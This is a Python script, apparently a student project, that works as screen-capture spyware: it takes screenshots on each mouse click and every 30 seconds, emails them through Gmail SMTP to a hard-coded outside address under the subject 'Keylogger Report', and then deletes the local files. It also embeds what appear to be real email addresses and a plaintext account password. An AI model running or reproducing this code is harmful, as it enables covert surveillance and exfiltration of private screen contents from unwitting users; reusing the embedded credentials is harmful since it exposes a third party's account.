import os
import pyscreenshot
from pynput.mouse import Listener
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.base import MIMEBase
from email import encoders

global path
path = './screenshot/'

global interval
interval = 30

global imageNumber
imageNumber = 0

def take_screenshot(path):
    global imageNumber
    image = pyscreenshot.grab()
    file_path = path + "screenshot" + str(imageNumber) + ".png"
    image.save(file_path)
    imageNumber += 1

def clean_directory(path):
    try:
        for file in os.listdir(path):
            os.remove(os.path.join(path, file))
        print('Files are deleted')
    except Exception as e:
        print(f'Error deleting files: {e}')

def send_email(subject, body, attachments=[]):
    from_email = "shrivarshan.c2022ece@sece.ac.in"  
    to_email = "shrivarshancsv@gmail.com"  
    password = "shrivarshan_csv1"  

    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    for attachment in attachments:
        part = MIMEBase('application', 'octet-stream')
        with open(attachment, 'rb') as img_file:
            part.set_payload(img_file.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(attachment)}"')
            msg.attach(part)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(from_email, password)
        smtp.sendmail(from_email, to_email, msg.as_string())

def on_click(x, y, button, pressed):
    global path
    if pressed:
        take_screenshot(path)
        print('Screenshot taken')

def report():
    global path, interval
    
    # Ensure the directory exists
    if not os.path.exists(path):
        os.makedirs(path)

    # Take a screenshot
    take_screenshot(path)

    # Attachments include all files in the directory
    attachments = [os.path.join(path, file) for file in os.listdir(path)]

    # Send email with attachments
    send_email('Keylogger Report', 'Screenshots attached.', attachments)

    print('Mail sent.')

    # Clean the directory after sending
    clean_directory(path)
    print('Cleaning directory...')

    # Schedule the next timer
    timer = threading.Timer(interval, report)
    timer.start()


# Start the mouse listener
with Listener(on_click=on_click) as listener:
    # Initial call to start the process
    report()
    listener.join()
